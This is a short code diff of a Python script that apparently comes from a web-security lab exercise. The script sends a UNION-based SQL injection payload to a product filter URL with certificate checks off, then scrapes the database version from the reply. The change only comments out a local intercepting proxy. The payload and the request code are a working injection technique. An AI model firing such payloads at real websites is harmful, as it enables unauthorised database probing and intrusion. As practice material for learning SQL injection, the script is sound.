@@ -11,7 +11,7 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 def exploit_sqli_version(url):
     path = "/filter?category=Accessories"
     sql_payload = "' UNION SELECT @@version, NULL%23"
-    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+    r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
     res = r.text
     soup = BeautifulSoup(res, 'html.parser')
     version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
